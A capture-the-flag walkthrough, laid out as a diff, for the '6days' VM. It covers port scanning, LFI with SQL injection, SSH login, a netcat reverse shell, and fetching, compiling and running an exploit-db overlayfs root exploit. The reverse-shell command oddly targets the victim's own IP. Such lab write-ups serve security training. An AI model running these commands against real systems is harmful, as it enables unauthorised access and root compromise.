@@ -1,0 +1,49 @@
+
+Hack the 6days VM (CTF Challenge)
+
+Hello friends! Today we are going to take another CTF challenge known as 6days. The credit for making this vm machine goes to “CanYouPwn.Me” and it is another boot2root challenge where we have to execute flag file to complete the challenge. You can download this VM here.
+Let’s Breach!!!
+Let us start form getting to know the IP of VM (Here, I have it at 192.168.0.18 but you will have to find your own)
+netdiscover
+
+Use nmap for port enumeration
+nmap -sV  192.168.0.18
+
+We find port is 80 open, so we open this ip on our browser.
+
+This page maybe vulnerable to SQL injection but a WAF is implemented to protect it. So we take a look at the source at the source code for further information.
+
+We find that this page maybe vulnerable to LFI and RFI so we use curl to implement our attack.
+
+We find that LFI is working on this site. Now we take a look at the config file to find the name of the database.
+
+Taking a look at the config file we found that it accessible through localhost. So we use SQL injection with LFI to access the database. Port 80 had WAF so we use 8080 to access the localhost.
+
+We find a username and password.  We know that ssh is open so we try this username and password to login through ssh.
+ssh andrea@192.168.0.18
+
+Now we are connected through ssh, but when we try to run commands it seems like no command is working. It is possible that output is redirected to null. So we use netcat to get a reverse shell
+First we set up a listener on our system first.
+nc -lvp  1234
+
+No we try to connect using netcat reverse shell
+nc -e /bin/sh 192.168.0.18 1234
+
+When we got the shell we see that we can see the output of the commands. We also find that the OS is Ubuntu 12.04, which is vulnerable to overlays exploit.
+
+So we move to /tmp/ folder and download overlays exploit and save it as exploit.c
+cd /tmp/
+wget https://www.exploit-db.com/download/37292  –no-check-certificate
+mv 37292 exploit.c
+
+We compile the file and save it as exploit. We give it executable permission then run the file.
+gcc –o exploit exploit.c
+chmod 777 exploit
+./exploit
+
+Now we have root access. When we go back we find an executable file called flag.
+
+When we run the executable file it shows us a congratulation message stating we completed the challenge.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
+ 
